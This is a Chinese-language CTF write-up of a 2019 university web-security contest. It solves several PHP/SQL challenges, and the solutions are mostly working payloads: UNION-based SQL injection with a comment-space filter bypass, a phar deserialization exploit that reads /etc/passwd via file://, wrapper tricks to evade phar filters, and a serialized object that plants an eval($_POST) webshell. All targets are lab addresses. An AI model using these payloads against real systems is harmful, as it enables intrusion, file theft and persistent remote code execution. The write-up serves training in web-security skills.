http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup

# babyphp

![](wp2019/截屏2021-10-07%2016.16.54.png)

get http://172.16.172.202/2019/babyphp/index.php?msg_getout=flag&flag=msg_getout

![](wp2019/截屏2021-10-07%2016.08.57.png)

![](wp2019/截屏2021-10-07%2016.09.05.png)

![](wp2019/截屏2021-10-07%2016.09.12.png)

参考连接 https://www.php.net/manual/zh/language.variables.variable.php

# babysql

flag在flag表flag列

推测其users表一共由三列

传入`' UNION SELECT 1,2,flag FROM flag#`得到flag

# babyupload

![](wp2019/截屏2021-10-07%2016.27.07.png)

# easygame

```
POST /?Xp0int=JNU HTTP/1.1
Host: 172.16.172.202:8003
Content-Length: 13
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
Origin: http://172.16.172.202:8003
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.172.202:8003/?Xp0int=JNU
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=XDEBUG_ECLIPSE
X-Forwarded-For: 127.0.0.1
Connection: close

Xp0int=JNUJNU
```

按照提示构造报文即可

# easyphp

[哈希长度扩展攻击](https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/)

![](wp2019/截屏2021-10-07%2020.06.32.png)

# easysql

flag在flag表flag列

推测其users表一共由三列,空格被过滤,用`/**/`代替空格

传入`'/**/UNION/**/SELECT/**/1,2,flag/**/FROM/**/flag#`得到flag

# easyupload

![](wp2019/截屏2021-10-07%2021.24.33.png)

# image-checker

从`class.php`可以得知存在`curl_exec`,可以使用`file://`协议来进行文件读取

从题目主页面和`imagesize.php`文件名推测其使用了`getimagesize`函数,可以利用phar反序列漏洞

---

>把博客的内容再写一遍...

```php
<?php
    class Demo{}
    $phar=new Phar("asdf.phar");//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");//设置存根stub
    $test=new Demo();
    $test->name='asdfgh';
    $phar->setMetadata($test);//将自定义的meta-data序列化后存入manifest
    $phar->addFromString("test.txt","asdfghjkl");//phar本质上是对文件的压缩所以要添加要压缩的文件
    $phar->stopBuffering();
?>
```

>生成phar文件要先将ini中的`phar.readonly`设置为Off

1. 文件标识,必须以`__HALT_COMPILER();?>`结尾,前面的内容没有限制,因此可以对文件头进行伪造

2. `meta-data`被序列化存储,通过`phar://`协议解析时会将其进行反序列化

受影响的函数

```
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| fileatime          | filectime      | file_exists   | file_get_contents  | touch             | get_meta_tags          |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| file_put_contents  | file           | filegroup     | fopen              | hash_file         | get_headers            |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| fileinode          | filemtime      | fileowner     | fileperms          | md5_file          | getimagesize           |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| is_dir             | is_executable  | is_file       | is_link            | sha1_file         | getimagesizefromstring |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| is_readable        | is_writable    | is_writeable  | parse_ini_file     | hash_update_file  | imageloadfont          |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
| copy               | unlink         | stat          | readfile           | hash_hmac_file    | exif_imagetype         |
+--------------------+----------------+---------------+--------------------+-------------------+------------------------+
```

```php
<?php
    class Demo{
        function __destruct(){
            echo $this->name."\n";
        }
    }
    $filename="phar://asdf.phar/test.txt";
    file_exists($filename);#执行反序列化,输出asdfgh
?>
```

对文件头进行伪造,可以将phar文件伪装成pdf或gif等文件

```php
<?php
    class Demo{}
    @unlink("asdf.phar");
    $phar=new Phar("asdf.phar");//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("%PDF-1.6<?php __HALT_COMPILER(); ?>");//设置pdf的文件头
    $test=new Demo();
    $test->name='asdfgh';
    $phar->setMetadata($test);
    $phar->addFromString("test.txt","asdfghjkl");
    $phar->stopBuffering();
?>
```

```
 ~/桌面 file asdf.phar
asdf.phar: PDF document, version 1.6
```

在生成phar文件后,可以对其文件后缀进行修改,不影响使用

当发生禁止phar开头时,可以用以下协议代替

```
compress.zlib://phar://phar.phar/test.txt
compress.bzip2://phar://phar.phar/test.txt 
php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt
```

```php
<?php
    class Demo{
        function __destruct(){
            echo "<br>".$this->name."<br>";
        }
    }
    $filename="php://filter/read=convert.base64-encode/resource=phar://asdf.phar/test.txt";
    file_get_contents($filename);#执行反序列化,输出asdfgh
?>
```

---

题目要生成的phar文件

```php
<?php
class CurlClass
{
}
class MainClass
{
    public function __construct($path)
    {
        $this->call = "httpGet";
        $this->arg = "file://" . $path;
    }
}
$phar = new Phar("asdf.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置存根stub
$test = new MainClass('/etc/passwd');
$test->name = 'asdfgh';
$phar->setMetadata($test); //将自定义的meta-data序列化后存入manifest
$phar->addFromString("test.jpeg", "asdfghjkl"); //phar本质上是对文件的压缩所以要添加要压缩的文件
$phar->stopBuffering();
```

将phar文件修改为jpeg文件,上传即可

在check image size中传入`compress.zlib://phar://uploads/487dfa0355.jpeg/test.jpeg`即可

# lottery

```python
import json

import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62',
           'Content-Type': 'application/x-www-form-urlencoded'}


def burp():
    url = "http://172.16.172.202:8008/data.php"
    while 1:
        r = requests.post(url=url, headers=headers)
        result = json.loads(r.text)
        if result['flag'][0:5] == "flag{":
            print(result)
            break


if __name__ == '__main__':
    burp()
```

# unserialize

传入`source=1`,得到源代码

构造`A[]=1&B[]=2`使得其满足`$_GET['A']!=$_GET['B'] && $md51 === $md52`的条件

```php
<?php

class Getflag{
	protected $value=1;

	public function __destruct(){
	}

}
$a=new Getflag();
print_r(urlencode(serialize($a)));
```

`O%3A7%3A%22Getflag%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Bi%3A1%3B%7D`

构造反序列化,但注意`$ans=str_replace('Getflag', '', $ans);`存在关键词替换,使用双写绕过即可

`O%3A7%3A%22GGetflagetflag%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Bi%3A1%3B%7D`

`http://172.16.172.202:8009/?source=1&A[]=1&B[]=2&ans=O%3A7%3A%22GGetflagetflag%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Bi%3A1%3B%7D`

得到`flag{flag_1s_in_youcantfind/d0cb52940652171fc01a7639aa7285537f13ad97.php}`

打开[http://172.16.172.202:8009/youcantfind/d0cb52940652171fc01a7639aa7285537f13ad97.php](http://172.16.172.202:8009/youcantfind/d0cb52940652171fc01a7639aa7285537f13ad97.php)

构造反序列化使得filename与out一致且out中包含webshell即可

```php
<?php
error_reporting(0);
show_source(__FILE__);
class CatchRecord
{

        public $filename, $out, $msg;
        public function __construct(){
            $this->out=&$this->filename;
            $this->msg='/<?php eval($_POST[a]);?>/../a.php';
            $this->out = date("Y/m/d/H/i/s") . "/" . $_SERVER['REMOTE_ADDR'] . "/" . $this->msg;
            var_dump($this->filename);
            var_dump($this->out);
        }
    }
$a=new CatchRecord();
var_dump(serialize($a));
```

```php
string '2021/10/08/03/50/36/172.16.172.202//<?php eval($_POST[a]);?>/../a.php' (length=69)
string '2021/10/08/03/50/36/172.16.172.202//<?php eval($_POST[a]);?>/../a.php' (length=69)
string 'O:11:"CatchRecord":3:{s:8:"filename";s:69:"2021/10/08/03/50/36/172.16.172.202//<?php eval($_POST[a]);?>/../a.php";s:3:"out";R:2;s:3:"msg";s:34:"/<?php eval($_POST[a]);?>/../a.php";}' (length=181)
```

https://hujiekang.top/2020/09/25/PHP-unserialize-advanced/

关于对象引用r和指针引用R：

这两者在引用方式上是有区别的，可以理解为对象引用是一个单边的引用，被赋值的那个变量可以任意修改值，而不会影响到被引用的那个对象；而指针引用则是一个双边的引用，被赋值的那个变量若做了改动，被引用的那个对象也会被修改。也就是说指针引用其实就是两个对象指针指向了同一块内存区域，所以任一指针的数值修改其实都是在对这块内存做修改，也就会影响到另一个指针的值；而对象引用的被赋值对象就像一个临时的指针，指向了被引用对象的内存区域，而当被赋值对象的值修改之后，这个临时指针就指向了另一块内存。